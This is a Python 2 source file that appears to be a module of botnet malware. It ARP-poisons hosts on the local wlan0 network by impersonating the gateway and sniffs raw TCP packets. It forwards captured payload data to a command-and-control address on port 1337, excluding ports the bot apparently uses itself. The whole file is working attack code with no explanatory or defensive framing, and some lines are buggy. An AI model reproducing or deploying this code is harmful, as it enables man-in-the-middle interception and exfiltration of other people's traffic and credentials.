import re,socket,subprocess,os,sys,urllib2,urllib,ctypes,time,threading,random,itertools,platform,multiprocessing,subprocess,fcntl,select,ssl,json
from string import letters,split,rstrip
from binascii import unhexlify
from base64 import b64decode
from uuid import getnode
from sys import argv
from struct import *
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
def getPoisonIPs():
    myip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
    poison=[]
    fh=open("/proc/net/arp", "rb")
    table_=fh.readlines()
    fh.close()
    table_.pop(0)
    for x in table_:
        x=x.split()
        if x[2]=="0x2":
            if x[0] != myip:
                poison.append((x[0], x[3]))
    return poison

def get_src_mac():
    mac_dec = hex(getnode())[2:-1]
    while (len(mac_dec) != 12):
        mac_dec = "0" + mac_dec
    return unhexlify(mac_dec)


def create_dst_ip_addr():
    dst_ip_addr = ''
    ip_src_dec = argv[2].split(".")
    for i in range(len(ip_src_dec)):
        dst_ip_addr += chr(int(ip_src_dec[i]))
    return dst_ip_addr

def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(pack("<L", int(fields[2], 16)))

def create_pkt_arp_poison():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind(("wlan0", 0))

    while(1):
        for lmfao in getPoisonIPs():
            src_addr = get_src_mac()
            dst_addr = lmfao[0]
            src_ip_addr = get_default_gateway_linux()
            dst_ip_addr = lmfao[1]
            dst_mac_addr = "\x00\x00\x00\x00\x00\x00"
            payload = "\x00\x01\x08\x00\x06\x04\x00\x02"
            checksum = "\x00\x00\x00\x00"
            ethertype = "\x08\x06"
            s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
                   + dst_mac_addr + dst_ip_addr + checksum)
        time.sleep(2)

global pause
pause = 1
def bigSNIFFS(cncip):
    global pause
    up = 0
    SIOCGIFFLAGS = 0x8913
    null256 = '\0'*256
    ifname = "wlan0"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        result = fcntl.ioctl(s.fileno(  ), SIOCGIFFLAGS, ifname + null256)
        flags, = unpack('H', result[16:18])
        up = flags & 1
    except:
        pass
    if up == 1:
        threading.Thread(target=create_pkt_arp_poison,args=()).start()
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error,msg:
        return
    count = 0
    while True:
        if pause == 1:
            continue
        try:
            packet = s.recvfrom(65565)
            count= count+1
            packet=packet[0]
            eth_length = 14
            eth_header = packet[:eth_length]
            eth_unpack =  unpack('!6s6sH',eth_header)
            eth_protocol = socket.ntohs(eth_unpack[2])
            ip_header = packet[0:20]
            header_unpacked = unpack('!BBHHHBBH4s4s',ip_header)
            version_ih1= header_unpacked[0] 
            version = version_ih1 >> 4 
            ih1 = version_ih1 & 0xF
            
            iph_length = ih1*4
            
            ttl = header_unpacked[5]
            protocol = header_unpacked[6]
            source_add = socket.inet_ntoa(header_unpacked[8])
            destination_add = socket.inet_ntoa(header_unpacked[9])
            tcp_header = packet[iph_length:iph_length+20]

            #unpack them 
            tcph = unpack('!HHLLBBHHH',tcp_header)
            
            source_port = tcph[0]
            dest_port = tcph[1]
            sequence = tcph[2]
            ack = tcph[3]
            resrve = tcph[4]
            tcph_len = resrve >> 4
            h_size = iph_length+tcph_len*4
            data_size = len(packet)-h_size
            print(data)
            data = packet[h_size:]
            if len(data) > 2 and source_port!=1337 and source_port!=6667 and source_port!=23 and source_port!=443 and source_port!=37215 and source_port!=53 and source_port!=22 and dest_port!=1337 and dest_port!=6667 and dest_port!=23 and dest_port!=443 and dest_port!=37215 and dest_port!=53 and dest_port!=22:
                try:
                    ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    ss.connect((cncip, 1337))
                    ss.send('IPv'+str(version)+ '\nTTL:'+str(ttl)+'\nProtocol:'+str(protocol)+"\nSource Address:"+str(source_add)+"\nDestination Address:"+str(destination_add)+"\n-------------------------------------------\n\nSource Port:"+str(source_port)+"\nDestination Port:"+str(dest_port)+"\n##########BEGINDATA##################\n"+data+"------------------------------------\n\n###########ENDDATA###################\n")
                    ss.close()
                except:
                    pass
        except:
            pass


ETH_P_IP = 0x0800 # Internet Protocol Packet

